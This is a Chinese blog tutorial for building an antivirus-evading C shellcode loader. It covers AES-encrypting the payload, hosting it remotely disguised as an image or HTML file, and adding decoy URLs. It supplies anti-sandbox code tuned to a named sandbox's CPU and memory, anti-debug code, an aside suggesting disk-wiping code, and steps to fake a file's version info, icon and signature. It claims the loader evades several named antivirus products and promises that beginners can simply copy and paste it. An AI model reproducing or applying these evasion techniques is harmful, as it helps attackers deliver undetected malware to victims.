
<!DOCTYPE html>
<html lang="en">
<head>

    <meta charset="utf-8" />
    <title>基于C语言shellcode加载器 | W000i</title>
    <meta name="author" content="W00i" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
    />
    <link rel="icon" href="/images/avatar.jpg" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.googleapis.cn" />
<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
<link
    rel="stylesheet"
    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
/>
<script> const mixins = {}; </script>

<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>



<script src="/js/lib/preview.js"></script>









<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>W000I</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;主页</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;W000I</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div class="article">
    <div>
        <h1>基于C语言shellcode加载器</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/8/19
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            
            <span class="tag">
                
                <a href="/tags/%E5%85%8D%E6%9D%80/" style="color: #00a596">
                    免杀
                </a>
            </span>
            
            <span class="tag">
                
                <a href="/tags/C-C/" style="color: #ffa2c4">
                    C/C++
                </a>
            </span>
            
        </span>
        
    </div>
    
    <div class="content" v-pre>
        <p>看了很多C语言的免杀，大部分都是本地加载+异或加密或者多来几次异或加密，刚好有时间就用C语言写了一个shellcode加载器，无须安装任何库即可使用，实现了远程加载shellcode，AES加密解密，反调试，反沙箱，小白直接复制粘贴也能实现免杀。</p>
<span id="more"></span>

<h2 id="shellcode加密"><a href="#shellcode加密" class="headerlink" title="shellcode加密"></a>shellcode加密</h2><p>aes库在网上找了一个简单修改了一下，最终会打包vs的工程文件，生成shellcode直接写到代码里即可加密和生成免杀的马。</p>
<p>生成.C格式的shellcode</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728192433331.png" alt="image-20240728192433331"></p>
<p>打开Aes加解密目录下的sln</p>
<p>自行修改密钥和自己生成的shellcode</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240727203807145.png" alt="image-20240727203807145"></p>
<p>设置完成后ctrl+F5</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728192607968.png" alt="image-20240728192607968"></p>
<p>记录下shellcode length和加密后的值</p>
<h2 id="shellcode分离加载"><a href="#shellcode分离加载" class="headerlink" title="shellcode分离加载"></a>shellcode分离加载</h2><p>加密后的shellcode保存到本地，后缀最好改成html,png这类。然后python开启一个http服务或者apache在服务器开一个服务，以便远程加载调用。</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728195944014.png" alt="image-20240728195944014"></p>
<p>打开AES加载器目录下的sln</p>
<p>修改key和加密那个项目的key一致</p>
<p>plaintext_length改为加密输出的shellcode length值</p>
<p>url换成自己托管的地址（这里可以多写一点没用的地址，比如url1&#x3D;xxx，后面不调用，这样别人搜索字符串都是一些没用的地址）</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728000326499.png" alt="image-20240728000326499"></p>
<p>然后生成解决方案，此时已经可以过火绒和360了，并且执行命令也没有拦截。</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240725184811338.png" alt="image-20240725184811338"></p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240727222824370.png" alt="image-20240727222824370"></p>
<h2 id="反沙箱"><a href="#反沙箱" class="headerlink" title="反沙箱"></a>反沙箱</h2><p>反沙箱一般可以从CPU个数，内存大小，mac地址，进程数量，USB接口数量等方式进行判断。</p>
<p>进程数量有些沙箱会开一些没用的进程，也能达到100多进程在运行。</p>
<p>USB接口发现在一些系统不是很准，而且有的地方不让插U盘。</p>
<p>所以常用的还是cpu和内存来判断。</p>
<p>通过上传调试文件得到微步沙箱CPU核数为4个，内存为6G</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728150136513.png" alt="image-20240728150136513"></p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728150401223.png" alt="image-20240728150401223"></p>
<p>判断cpu个数和内存大小来过沙箱：</p>
<pre><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

// 检查内存是否足够
int checkMemory(float minMemoryGB) &#123;
    MEMORYSTATUSEX memStat;
    memStat.dwLength = sizeof(memStat);
    GlobalMemoryStatusEx(&amp;memStat);

    // 打印总物理内存（以GB为单位）
    float totalMemoryGB = (float)memStat.ullTotalPhys / 1073741824;
    printf(&quot;系统总物理内存: %.2f GB\n&quot;, totalMemoryGB);

    // 检查内存是否小于指定值
    if (totalMemoryGB &lt; minMemoryGB) &#123;
        //printf(&quot;系统内存少于 %.2f GB。程序退出。\n&quot;, minMemoryGB);
        return 1;
    &#125;
    return 0;
&#125;

// 检查CPU核心数是否足够
int checkProcessors(int minProcessors) &#123;
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&amp;systemInfo);
    int numProcessors = systemInfo.dwNumberOfProcessors;

    printf(&quot;CPU核心数: %d\n&quot;, numProcessors);

    // 检查CPU核心数是否小于指定的最小值
    if (numProcessors &lt; minProcessors) &#123;
        //printf(&quot;CPU核心数少于 %d 个。程序退出。\n&quot;, minProcessors);
        return 1;
    &#125;
    return 0;
&#125;
</code></pre>
<p>写在main函数下面</p>
<pre><code>// 内存和cpu最小值
float minMemoryGB = 6.0; // 最小内存为6 GB
int minProcessors = 4;   // 最小CPU核心数为4

// 检查CPU和内存
if (checkMemory(minMemoryGB) != 0 || checkProcessors(minProcessors) != 0) &#123;
    printf(&quot;不满足条件\n&quot;);
    exit(EXIT_FAILURE);
&#125;

printf(&quot;内存和CPU核心数满足条件\n&quot;);
</code></pre>
<p>虚拟机测试，CPU和内存过小，程序退出</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728161109063.png" alt="image-20240728161109063"></p>
<p>当然物理机还是没问题的，可以正常执行后面的代码</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728160752384.png" alt="image-20240728160752384"></p>
<h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><p>CheckRemoteDebuggerPresent函数用于检测指定进程是否正在被远程调试器监视。</p>
<p>为了防止附加进程，设置 BeingDebugged标志为1假装程序正在被调试。</p>
<pre><code>    BOOL isDebuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;isDebuggerPresent);
    if (isDebuggerPresent) &#123;
        printf(&quot;调试环境&quot;);
        return 0;
    &#125;
    printf(&quot;正常环境&quot;);
    PPEB pPEB = (PPEB)__readfsdword(0x30);
    pPEB-&gt;BeingDebugged = 1;
</code></pre>
<p>放到OD运行提示调试环境</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728163558342.png" alt="image-20240728163558342"></p>
<p>接下来把代码放到反沙箱检测下面，那些打印去掉，打包放在OD运行直接挂了，X32dbug一样挂。</p>
<p>有兴趣的还可以在检测到调试环境后加上格盘代码。</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728163843755.png" alt="image-20240728163843755"></p>
<h2 id="添加资源"><a href="#添加资源" class="headerlink" title="添加资源"></a>添加资源</h2><p>添加—资源</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728173431711.png" alt="image-20240728173431711"></p>
<p>选择icon—导入</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728173622861.png" alt="image-20240728173622861"></p>
<p>选择ico图标，如果需要换图标直接替换ico文件。</p>
<p>替换图标后生成解决方案，有时候图标不会变，这时候重命名一下就可以刷新了。</p>
<p>添加详细信息：</p>
<p>这时候打包的文件是没有详细信息的</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728180555975.png" alt="image-20240728180555975"></p>
<p>打开资源视图-在.rc文件右键添加资源</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728180529349.png" alt="image-20240728180529349"></p>
<p>先把版本、公司、中文那些改了生成解决方案对照看看哪里还有问题</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728181825337.png" alt="image-20240728181825337"></p>
<p>最终我们生成的文件和官方文件基本一致</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728182000804.png" alt="image-20240728182000804"></p>
<p>添加签名</p>
<p>使用工具加签</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/thelostworldFree/Sign-Sacker">https://github.com/thelostworldFree/Sign-Sacker</a></p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728182812043.png" alt="image-20240728182812043"></p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728182917365.png" alt="image-20240728182917365"></p>
<h2 id="免杀效果"><a href="#免杀效果" class="headerlink" title="免杀效果"></a>免杀效果</h2><p>火绒</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728190055199.png" alt="image-20240728190055199"></p>
<p>360</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728190634545.png" alt="image-20240728190634545"></p>
<p>微步沙箱安全</p>
<p><a target="_blank" rel="noopener" href="https://s.threatbook.com/report/file/9700e3e38848d489a3398887ba9a9b98e98ffc05f1c31c95dca3cb1bab0200a0?sign=history&env=win10_1903_enx64_office2016">https://s.threatbook.com/report/file/9700e3e38848d489a3398887ba9a9b98e98ffc05f1c31c95dca3cb1bab0200a0?sign=history&amp;env=win10_1903_enx64_office2016</a></p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728191628706.png" alt="image-20240728191628706"></p>
<p>多引擎检测均为安全</p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728191654685.png" alt="image-20240728191654685"></p>
<p>virustota有一点高</p>
<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/9700e3e38848d489a3398887ba9a9b98e98ffc05f1c31c95dca3cb1bab0200a0?nocache=1">https://www.virustotal.com/gui/file/9700e3e38848d489a3398887ba9a9b98e98ffc05f1c31c95dca3cb1bab0200a0?nocache=1</a></p>
<p><img src="/../imgs/%E5%9F%BA%E4%BA%8EC%E8%AF%AD%E8%A8%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20240728191023388.png" alt="image-20240728191023388"></p>

    </div>
    
    
    
    
    
    
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 W000i
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;W00i
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
    




    
	
	
	{% if theme.fireworks %}
   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
   <script type="text/javascript" src="/js/lib/fireworks.js"></script>
    {% endif %}
 
</body>
</html>
